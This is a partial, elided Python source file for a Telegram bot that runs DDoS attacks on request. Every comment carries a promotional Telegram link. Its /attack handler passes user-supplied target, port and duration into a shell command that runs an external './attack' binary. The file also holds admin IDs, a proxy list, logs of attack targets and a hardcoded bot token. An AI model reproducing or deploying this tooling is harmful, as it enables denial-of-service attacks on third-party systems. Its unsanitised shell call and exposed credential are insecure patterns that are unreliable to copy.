...
# Join :- https://t.me/+ixbPrD2t40UyODg9 #attackddoserpython
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 #from keep_alive import keep_alive
# Join :- https://t.me/+ixbPrD2t40UyODg9 #keep_alive()
# Join :- https://t.me/+ixbPrD2t40UyODg9 # insert your Telegram bot token here
bot = telebot.TeleBot('7084372145:AAGpcVGyo4_t0X24Hfm2cN2b25DpfOkI7gw')

# Join :- https://t.me/+ixbPrD2t40UyODg9 # Admin user IDs
admin_id = ["1914933113","1914933113","-1002179025921"]

# Join :- https://t.me/+ixbPrD2t40UyODg9 # File to store allowed user IDs
USER_FILE = "users.txt"

# Join :- https://t.me/+ixbPrD2t40UyODg9 # File to store command logs
LOG_FILE = "log.txt"


# Join :- https://t.me/+ixbPrD2t40UyODg9 # List of proxy addresses
PROXIES = [
...
"https://134.73.65.97:6649"
    # Join :- https://t.me/+ixbPrD2t40UyODg9 # Add more proxy addresses as needed
]
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Check if line is not empty
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Join :- https://t.me/+ixbPrD2t40UyODg9 # Function to clear logs
def clear_logs():
    try:
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Function to record command logs
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Function to handle the reply when free users run the /attack command
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Dictionary to store the last time each user ran the /attack command
attack_cooldown = {}

COOLDOWN_TIME =0

# Join :- https://t.me/+ixbPrD2t40UyODg9 # Handler for /attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Join :- https://t.me/+ixbPrD2t40UyODg9 # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Join :- https://t.me/+ixbPrD2t40UyODg9 # Check if the user has run the command before and is still within the cooldown period
            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < 2:
                response = "You Are On Cooldown . Please Wait 2sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Join :- https://t.me/+ixbPrD2t40UyODg9 # Update the last time the user ran the command
            attack_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Convert time to integer
            time = int(command[3])  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Convert port to integer
            if time > 500:
                response = "Error: Time interval must be less than 180."
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Call start_attack_reply function
                full_command = f"./attack {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"attack Attack Finished. Target: {target} Port: {port} Port: {time}"
        else:
            response = "✅ Usage :- /attack <target> <port> <time>"  # Join :- https://t.me/+ixbPrD2t40UyODg9 # Updated command syntax
    else:
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Add /mylogs command to display logs recorded for attack and website commands
...
By https://t.me/+ixbPrD2t40UyODg9
'''
...
✅Join :- By https://t.me/+ixbPrD2t40UyODg9'''
    bot.reply_to(message, response)
...
# Join :- https://t.me/+ixbPrD2t40UyODg9 # Import the 'time' module for sleep functionality
import time
